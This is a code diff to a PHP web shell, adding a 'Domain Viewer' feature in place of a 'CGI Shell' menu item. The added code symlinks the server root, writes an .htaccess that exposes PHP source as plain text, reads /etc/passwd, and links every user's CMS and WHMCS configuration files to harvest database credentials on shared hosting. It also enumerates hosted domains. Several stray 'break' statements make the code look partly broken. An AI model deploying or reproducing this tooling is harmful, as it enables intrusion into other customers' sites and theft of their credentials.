@@ -397,7 +397,7 @@ echo "<li>[ <a href='?dir=$dir&k3=passwbypass'>Bypass etc/passw</a> ]<br></li>";
 echo "<li>[ <a href='?dir=$dir&k3=loghunter'>Log Hunter</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=shellchk'>Shell Checker</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=shelscan'>Shell Finder</a> ]</li>";
-echo "<li>[ <a href='?dir=$dir&k3=cgi'>CGI Shell</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&k3=domview'>Domain Viewer</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=cgi2'>CGI Shell 2</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=x48x'>x48x Mini Shell</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=zip'>Zip Menu</a> ]</li>";
@@ -418,6 +418,175 @@ if($_GET['k3'] == 'upload') {
 	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
 	echo $act;
 	echo "</center>";
+}
+elseif($_GET['k3'] == 'domview'){
+	echo '<form action="?path=<?php echo $path; ?>&amp;x=vn" method="post">
+					<center><h2>Domain Viewer</h2></center><br><br>';
+	function openBaseDir()
+				{
+				$openBaseDir = ini_get("open_basedir");
+				if (!$openBaseDir)
+				    {
+				        $openBaseDir = '<font color="green">OFF</font>';
+				    }
+				    else 
+				    {
+				        $openBaseDir = '<font color="red">ON</font>';
+				    }    
+				    return $openBaseDir;
+				}
+
+
+				echo '
+				    <table width="95%" cellspacing="0" cellpadding="0"  >
+				    <td height="100" align="left" >';
+				    $pg = basename(__FILE__);
+				    $safe_mode = @ini_get('safe_mode');
+				    $dir = @getcwd();
+					////////////////////////////////////////////////////
+					#.htaccess
+				@mkdir('pee',0777);
+				@symlink("/","pee/root");
+				$htaccss = "Options all 
+				 DirectoryIndex Sux.html 
+				 AddType text/plain .php 
+				 AddHandler server-parsed .php 
+				  AddType text/plain .html 
+				 AddHandler txt .html 
+				 Require None 
+				 Satisfy Any";
+				 
+				file_put_contents("pee/.htaccess",$htaccss);
+				$etc = file_get_contents("/etc/passwd");
+				$etcz = explode("\n",$etc);
+
+
+				##Symlink to the ROOT :p
+				foreach($etcz as $etz){
+				$etcc = explode(":",$etz);
+				error_reporting(0);
+
+				$current_dir = posix_getcwd();
+				$dir = explode("/",$current_dir);
+
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"pee/".$etcc[0].'-PhpBB.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"pee/".$etcc[0].'-vBulletin.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"pee/".$etcc[0].'-IPB.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"pee/".$etcc[0].'-MyBB.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"pee/".$etcc[0].'-SMF.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"pee/".$etcc[0].'-Drupal.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"pee/".$etcc[0].'-e107.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"pee/".$etcc[0].'-Seditio.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"pee/".$etcc[0].'-osCommerce.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
+				}
+				#############################
+					if(is_readable("/var/named")){
+					echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
+					echo'<tr><td><center><b>SITE</b></center></td><td>
+					<center><b>USER</b></center></td>
+					<td></center><b>SYMLINK</b></center></td>';
+					$list = scandir("/var/named");
+					foreach($list as $domain){
+					if(strpos($domain,".db")){
+					$i += 1;
+					$domain = str_replace('.db','',$domain);
+					$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
+
+					echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
+					<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
+					<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+						}
+					}
+					echo "<center>Total Domains Found: ".$i."</center><br />";
+					}else{ 
+					echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>"; }
+
+				break;
+
+				##################################
+				error_reporting(0);
+				$etc = file_get_contents("/etc/passwd");
+				$etcz = explode("\n",$etc);
+				if(is_readable("/etc/passwd")){
+
+				echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
+				echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';
+
+				$list = scandir("/var/named");
+
+				foreach($etcz as $etz){
+				$etcc = explode(":",$etz);
+
+				foreach($list as $domain){
+				if(strpos($domain,".db")){
+				$domain = str_replace('.db','',$domain);
+				$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
+				if($owner['name'] == $etcc[0])
+				{
+				$i += 1;
+				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
+				<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
+				<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+				}}}}
+				echo "<center>Total Domains Found: ".$i."</center><br />";}
+
+				break;
+				###############################
+				if(is_readable("/etc/named.conf")){
+				echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
+				echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
+				$named = file_get_contents("/etc/named.conf");
+				preg_match_all('%zone \"(.*)\" {%',$named,$domains);
+				foreach($domains[1] as $domain){
+				$domain = trim($domain);
+				$i += 1;
+				$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
+				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+				}
+				echo "<center>Total Domains Found: ".$i."</center><br />";
+
+				} else { echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>"; }
+
+				break;
+				############################
+				if(is_readable("/etc/valiases")){
+				echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
+				echo'<tr><td><center><b>SITE</b></center></td><td>
+				<center><b>USER</b></center></td><td></center>
+				<b>SYMLINK</b></center></td>';
+				$list = scandir("/etc/valiases");
+				foreach($list as $domain){
+				$i += 1;
+				$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
+				echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
+				<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
+				<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
+				}
+				echo "<center>Total Domains Found: ".$i."</center><br />";
+				} else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>"; }
+
+				break;
 }
 elseif($_GET['k3'] == 'cgi2') {
 	$cgi_dir = mkdir('kthree_cgi', 0755);
